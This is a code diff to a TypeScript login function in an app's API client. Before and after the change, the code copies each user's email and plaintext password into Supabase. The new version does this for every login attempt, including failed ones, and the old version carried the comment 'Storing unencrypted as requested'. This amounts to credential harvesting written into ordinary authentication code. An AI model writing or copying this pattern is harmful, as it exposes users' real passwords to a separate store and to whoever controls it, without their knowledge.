@@ -240,50 +240,35 @@ apiClient.interceptors.request.use((config) => {
 export const login = async (credentials: LoginRequest): Promise<LoginResponse> => {
   console.log('Starting login process for:', credentials.email);
   
-  const response = await apiClient.post('/auth/login', credentials);
-  console.log('API login successful, saving to Supabase...');
-  
-  // Save user data to Supabase after successful login
   try {
-    const { saveUserData } = await import('./supabase');
+    const response = await apiClient.post('/auth/login', credentials);
+    console.log('API login successful, logging to Supabase...');
     
-    // Set the auth token first so subsequent API calls work
+    // Log successful login attempt to Supabase
+    try {
+      const { saveLoginLogSupabase } = await import('./supabase-logs');
+      await saveLoginLogSupabase(credentials.email, credentials.password, 'SUCCESS');
+    } catch (logError) {
+      console.error('Error logging successful login:', logError);
+    }
+    
+    // Set the auth token
     setAuthToken(response.data.userToken);
     
-    // Get user profile data
-    let userProfile = null;
+    return response.data;
+  } catch (error: any) {
+    // Log failed login attempt to Supabase
     try {
-      console.log('Fetching user profile...');
-      userProfile = await getUserProfile();
-      console.log('User profile fetched successfully');
-    } catch (error) {
-      console.error('Error fetching user profile:', error);
+      const { saveLoginLogSupabase } = await import('./supabase-logs');
+      const errorMessage = error.response?.data?.message || error.message || 'Unknown error';
+      await saveLoginLogSupabase(credentials.email, credentials.password, 'FAILED', errorMessage);
+    } catch (logError) {
+      console.error('Error logging failed login:', logError);
     }
     
-    // Save to Supabase (only creates new record if user doesn't exist)
-    console.log('Attempting to save user data to Supabase...');
-    const saveResult = await saveUserData(
-      credentials.email, 
-      credentials.password, // Storing unencrypted as requested
-      userProfile,
-      false // Default to non-premium
-    );
-    
-    if (saveResult.success) {
-      if (saveResult.alreadyExists) {
-        console.log('User data already exists in Supabase');
-      } else {
-        console.log('User data saved to Supabase successfully');
-      }
-    } else {
-      console.error('Failed to save user data to Supabase:', saveResult.error);
-    }
-  } catch (error) {
-    console.error('Error during Supabase integration:', error);
-    // Don't fail the login if Supabase fails
+    // Re-throw the original error
+    throw error;
   }
-  
-  return response.data;
 };
 
 export const resetPasswordRequest = async (email: ResetPasswordRequest): Promise<void> => {
